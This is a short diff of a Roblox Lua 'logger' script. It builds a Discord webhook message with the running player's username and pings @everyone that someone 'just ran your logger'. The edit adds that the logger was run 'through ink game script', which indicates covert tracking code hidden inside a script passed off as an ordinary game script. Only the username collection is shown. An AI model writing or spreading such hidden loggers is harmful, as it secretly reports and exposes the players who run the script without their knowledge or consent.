@@ -16,7 +16,7 @@ local data = {
             ["username"] = "Salmon-L0G", --webhook name thing idk
             ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
     
-    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger", --normal message
+    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger through ink game script", --normal message
     ["embeds"] = {
        {
            ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just ran your logger**",
